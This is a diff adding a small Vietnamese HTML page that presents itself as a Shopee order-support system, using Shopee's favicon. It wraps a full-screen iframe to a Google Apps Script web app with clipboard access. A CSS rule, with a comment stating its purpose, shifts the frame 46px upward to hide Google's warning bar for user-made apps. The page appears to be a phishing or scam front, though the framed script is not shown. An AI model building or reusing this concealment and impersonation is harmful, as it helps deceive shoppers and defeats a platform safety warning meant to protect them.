@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Hệ Thống Đặt Hàng Shopee Hỗ Trợ</title>
+  <!-- Icon Shopee -->
+  <link rel="icon" href="https://deo.shopeemobile.com/chem/desktop/vi/favicon.ico" type="image/x-icon">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: #F8FAFC;
+    }
+    /* Đẩy thanh cảnh báo của Google (cao 46px) lên trên khỏi màn hình */
+    .app-frame-wrap {
+      position: fixed;
+      top: -46px;
+      left: 0;
+      width: 100%;
+      height: calc(100% + 46px);
+      overflow: hidden;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="app-frame-wrap">
+    <!-- Link Web App Google Apps Script của bạn -->
+    <iframe 
+      src="https://script.google.com/macros/s/AKfycbx5dYh2nejqU5YDwvDGxzmutTai0NPg7B55Bn9U2yOC7Q4RqHL9WH8tICrqI-3-RdIi/exec" 
+      allow="clipboard-write; clipboard-read"
+      loading="lazy">
+    </iframe>
+  </div>
+</body>
+</html>
